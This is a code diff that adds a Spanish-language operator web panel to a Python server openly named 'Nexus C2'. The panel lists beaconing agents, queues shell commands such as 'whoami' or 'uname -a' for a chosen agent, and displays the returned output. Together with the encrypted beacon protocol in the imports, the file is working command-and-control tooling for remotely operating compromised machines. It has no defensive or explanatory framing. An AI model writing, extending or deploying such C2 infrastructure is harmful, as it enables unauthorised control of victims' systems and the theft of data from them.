@@ -8,13 +8,186 @@ import uuid
 from aiohttp import web
 
 from protocol import (
-    MSG_HELLO, MSG_WELCOME, MSG_BEACON, MSG_TASK, MSG_RESULT,
+    MSG_HELLO, MSG_BEACON, MSG_TASK, MSG_RESULT,
     MSG_NOP, MSG_ERROR, MSG_NAMES,
     pack_clear, unpack_clear,
     server_process_hello, build_frame, parse_frame,
     generate_server_keypair, save_server_key, load_server_key, get_pub_bytes,
 )
 from cryptography.exceptions import InvalidTag
+
+# ---------------------------------------------------------------------------
+# Operator web panel (served at GET /)
+# ---------------------------------------------------------------------------
+_PANEL_HTML = """<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<title>Nexus C2</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0d0d0d;color:#e0e0e0;font-family:'Courier New',monospace;height:100vh;display:flex;flex-direction:column}
+header{background:#111;border-bottom:1px solid #00ff41;padding:10px 20px;display:flex;align-items:center;gap:16px}
+header h1{color:#00ff41;font-size:1.1em;letter-spacing:3px}
+header .badge{font-size:.7em;color:#444;border:1px solid #222;padding:2px 8px;border-radius:2px}
+.container{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:12px;flex:1;min-height:0}
+.panel{background:#111;border:1px solid #222;border-radius:3px;display:flex;flex-direction:column;overflow:hidden}
+.panel-title{background:#1a1a1a;border-bottom:1px solid #222;padding:7px 12px;font-size:.7em;color:#666;text-transform:uppercase;letter-spacing:1px}
+table{width:100%;border-collapse:collapse;font-size:.82em}
+th{background:#161616;color:#555;padding:6px 10px;text-align:left;font-size:.7em;text-transform:uppercase;border-bottom:1px solid #222}
+td{padding:7px 10px;border-bottom:1px solid #1a1a1a;cursor:pointer;white-space:nowrap}
+tr:hover td{background:#1a1a1a}
+tr.selected td{background:#071a07;border-left:2px solid #00ff41}
+.dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:5px}
+.online{background:#00ff41;box-shadow:0 0 5px #00ff41}
+.offline{background:#444}
+.jbar{display:inline-block;height:5px;border-radius:2px;vertical-align:middle;margin-right:5px;transition:width .4s,background .4s}
+.task-form{padding:10px;border-top:1px solid #222;display:none}
+.task-form label{font-size:.7em;color:#555;display:block;margin-bottom:4px;text-transform:uppercase}
+.task-form input{background:#1a1a1a;border:1px solid #333;color:#e0e0e0;padding:6px 10px;width:100%;font-family:inherit;font-size:.83em;outline:none;border-radius:2px}
+.task-form input:focus{border-color:#00ff41}
+.task-form button{background:#00ff41;color:#000;border:none;padding:6px 0;cursor:pointer;font-family:inherit;font-weight:bold;font-size:.8em;margin-top:6px;width:100%;border-radius:2px;letter-spacing:1px}
+.task-form button:hover{background:#00cc33}
+.task-form button:disabled{background:#1a3a1a;color:#00ff41;cursor:not-allowed}
+.toast{position:fixed;bottom:30px;right:20px;background:#1a1a1a;border:1px solid #00ff41;color:#00ff41;padding:8px 14px;font-size:.75em;border-radius:3px;opacity:0;transition:opacity .3s;pointer-events:none}
+.toast.show{opacity:1}
+.toast.err{border-color:#ff4444;color:#ff4444}
+.spinner{display:inline-block;animation:spin .8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.results-body{flex:1;overflow-y:auto;padding:10px}
+.r-entry{background:#161616;border:1px solid #222;border-radius:3px;margin-bottom:8px;padding:8px 10px}
+.r-meta{color:#555;font-size:.7em;margin-bottom:5px}
+.r-out{color:#c8c8c8;white-space:pre-wrap;word-break:break-all;font-size:.8em}
+.r-err{color:#ff6666;white-space:pre-wrap;word-break:break-all;font-size:.8em}
+.ok{color:#00ff41}.err{color:#ff4444}
+.empty{color:#333;text-align:center;padding:30px;font-size:.8em}
+.statusbar{background:#0a0a0a;border-top:1px solid #1a1a1a;padding:4px 16px;font-size:.68em;color:#333;display:flex;justify-content:space-between}
+</style>
+</head>
+<body>
+<header>
+  <h1>&#9632; NEXUS C2</h1>
+  <span class="badge">PANEL OPERADOR</span>
+  <span class="badge" id="hdr-count">...</span>
+</header>
+<div class="container">
+  <div class="panel">
+    <div class="panel-title">Agentes</div>
+    <div style="flex:1;overflow-y:auto">
+      <table>
+        <thead><tr><th>Estado</th><th>Agent ID</th><th>Jitter beacon</th><th>Pending</th></tr></thead>
+        <tbody id="agent-rows"><tr><td colspan="4" class="empty">Sin agentes</td></tr></tbody>
+      </table>
+    </div>
+    <div class="task-form" id="task-form">
+      <label>Agente: <span id="sel-id" style="color:#00ff41"></span></label>
+      <input id="cmd" type="text" placeholder="whoami / uname -a / ls -la ..."/>
+      <button id="exec-btn" onclick="sendTask()">&#9654; EJECUTAR</button>
+    </div>
+  </div>
+  <div class="panel">
+    <div class="panel-title">Resultados &mdash; <span id="res-agent" style="color:#00ff41">selecciona un agente</span> <span id="res-count" style="color:#444"></span></div>
+    <div class="results-body" id="results-body"><div class="empty">Selecciona un agente</div></div>
+  </div>
+</div>
+<div class="toast" id="toast"></div>
+<div class="statusbar"><span id="st-left">Conectando...</span><span id="st-right"></span></div>
+<script>
+let sel=null, agents=[], pendingTask=null, activePoll=null;
+const esc=s=>s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+function ts2str(ts){return ts?new Date(ts*1000).toLocaleTimeString():''}
+function jBar(ts,st){
+  if(st!=='online')return '<span style="color:#333">offline</span>';
+  const s=Math.floor(Date.now()/1000-ts);
+  const w=Math.min(80,(s/10)*80);
+  const c=s<8?'#00ff41':s<15?'#ffaa00':'#ff4444';
+  return `<span class="jbar" style="width:${w}px;background:${c}"></span><span style="color:${c}">${s}s</span>`;
+}
+function toast(msg,isErr=false){
+  const t=document.getElementById('toast');
+  t.textContent=msg; t.className='toast'+(isErr?' err':'');
+  requestAnimationFrame(()=>{t.classList.add('show')});
+  setTimeout(()=>t.classList.remove('show'),2500);
+}
+function setLoading(on){
+  const btn=document.getElementById('exec-btn');
+  btn.disabled=on;
+  btn.innerHTML=on?'<span class="spinner">&#9696;</span> EJECUTANDO...':'&#9654; EJECUTAR';
+}
+async function refresh(){
+  try{
+    const r=await fetch('/agents'); agents=await r.json();
+    const online=agents.filter(a=>a.status==='online').length;
+    document.getElementById('hdr-count').textContent=online+'/'+agents.length+' online';
+    document.getElementById('agent-rows').innerHTML=agents.length?agents.map(a=>`
+      <tr onclick="pick('${a.agent_id}')"${a.agent_id===sel?' class="selected"':''}>
+        <td><span class="dot ${a.status}"></span>${a.status}</td>
+        <td>${a.agent_id}</td>
+        <td>${jBar(a.last_seen,a.status)}</td>
+        <td>${a.pending_tasks}</td>
+      </tr>`).join(''):'<tr><td colspan="4" class="empty">Sin agentes registrados</td></tr>';
+    document.getElementById('st-left').textContent=online+' agente'+(online!==1?'s':'')+' online';
+    document.getElementById('st-right').textContent=new Date().toLocaleTimeString();
+  }catch(e){document.getElementById('st-left').textContent='Sin conexión con el servidor'}
+}
+async function pick(id){
+  if(activePoll){clearInterval(activePoll);activePoll=null;}
+  pendingTask=null; setLoading(false);
+  sel=id;
+  document.getElementById('sel-id').textContent=id;
+  document.getElementById('res-agent').textContent=id;
+  document.getElementById('task-form').style.display='block';
+  await refreshResults(); refresh();
+}
+async function refreshResults(){
+  if(!sel)return;
+  try{
+    const r=await fetch('/agents/'+sel+'/results');
+    const data=await r.json();
+    document.getElementById('res-count').textContent=data.length?'('+data.length+')':'';
+    if(!data.length){
+      document.getElementById('results-body').innerHTML='<div class="empty">Sin resultados aún</div>';
+      return;
+    }
+    const prev=Number(document.getElementById('results-body').dataset.count||0);
+    document.getElementById('results-body').innerHTML=[...data].reverse().map(r=>`
+      <div class="r-entry">
+        <div class="r-meta">task <b>${(r.task_id||'?').slice(0,8)}</b> &nbsp; exit <span class="${r.exit_code===0?'ok':'err'}">${r.exit_code}</span> &nbsp; ${ts2str(r.ts)}</div>
+        ${r.stdout?`<div class="r-out">${esc(r.stdout.trimEnd())}</div>`:''}
+        ${r.stderr?`<div class="r-err">${esc(r.stderr.trimEnd())}</div>`:''}
+      </div>`).join('');
+    document.getElementById('results-body').dataset.count=data.length;
+    if(pendingTask && data.length > prev){ setLoading(false); pendingTask=null; }
+  }catch(e){}
+}
+async function sendTask(){
+  const inp=document.getElementById('cmd');
+  const cmd=inp.value.trim();
+  if(!cmd||!sel)return;
+  try{
+    const r=await fetch('/agents/'+sel+'/task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd})});
+    const body=await r.json();
+    if(r.status===429){toast('Cola llena — intenta en un momento',true);return;}
+    if(!r.ok){toast('Error: '+body.error,true);return;}
+    inp.value='';
+    pendingTask=body.task_id;
+    setLoading(true);
+    toast('Tarea encolada — esperando beacon...');
+    let polls=0;
+    if(activePoll)clearInterval(activePoll);
+    activePoll=setInterval(async()=>{
+      await refreshResults();
+      if(!pendingTask||++polls>12){setLoading(false);pendingTask=null;clearInterval(activePoll);activePoll=null;}
+    },5000);
+  }catch(e){toast('Error de red',true);setLoading(false);}
+}
+document.getElementById('cmd').addEventListener('keydown',e=>{if(e.key==='Enter')sendTask()});
+refresh();
+setInterval(refresh,3000);
+setInterval(()=>{if(sel&&!pendingTask)refreshResults()},5000);
+</script>
+</body>
+</html>"""
 
 logging.basicConfig(
     level=logging.INFO,
@@ -344,6 +517,10 @@ async def api_get_results(request: web.Request) -> web.Response:
     return web.json_response(results[agent_id])
 
 
+async def handle_panel(request: web.Request) -> web.Response:
+    return web.Response(text=_PANEL_HTML, content_type="text/html")
+
+
 # ---------------------------------------------------------------------------
 # Background: offline monitor
 # ---------------------------------------------------------------------------
@@ -403,6 +580,7 @@ def build_app() -> web.Application:
         middlewares=[_operator_auth],
         client_max_size=1 * 1024 * 1024,  # 1 MB max request body
     )
+    app.router.add_get("/",                           handle_panel)
     app.router.add_post("/",                         handle_nexus)
     app.router.add_get("/agents",                    api_list_agents)
     app.router.add_post("/agents/{agent_id}/task",   api_enqueue_task)
